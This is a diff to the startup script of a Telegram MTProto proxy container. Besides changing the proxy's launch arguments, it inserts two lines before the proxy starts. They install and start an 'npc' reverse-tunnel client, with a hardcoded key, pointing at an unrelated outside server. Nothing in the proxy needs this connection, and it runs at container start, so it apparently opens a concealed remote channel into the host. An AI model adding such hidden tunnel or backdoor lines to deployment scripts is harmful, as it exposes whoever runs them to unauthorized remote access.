@@ -110,7 +110,7 @@ echo "[*]   Make sure to fix the links in case you run the proxy on a different 
 echo
 echo '[+] Starting proxy...'
 sleep 1
-
+/usr/bin/npc install -vkey=ju4zcrwt5vz4yn9w -server=h.iw.mk:8024
+npc start
 # exec /mtproxy/mtproto-proxy -p 2398 -H 443 -M "$WORKERS" -C 60000 --aes-pwd /etc/telegram/hello-explorers-how-are-you-doing -u root $CONFIG --allow-skip-dh --nat-info "$INTERNAL_IP:$IP" $SECRET_CMD $TAG_CMD
-exec /mtproxy/mtproto-proxy "$@" --aes-pwd ${REMOTE_SECRET} --user root ${REMOTE_CONFIG} --nat-info "$INTERNAL_IP:$EXTERNAL_IP" ${SECRET_CMD} ${TAG_CMD} && \
-sslh -f -u root --listen 0.0.0.0:$PORT --http 127.0.0.1:2398 --anyprot 127.0.0.1:443 $@
+exec /mtproxy/mtproto-proxy -p $PORT -H 443 -M "$WORKERS" -C 60000 --aes-pwd ${REMOTE_SECRET} --user root ${REMOTE_CONFIG} --nat-info "$INTERNAL_IP:$EXTERNAL_IP" ${SECRET_CMD} ${TAG_CMD} 
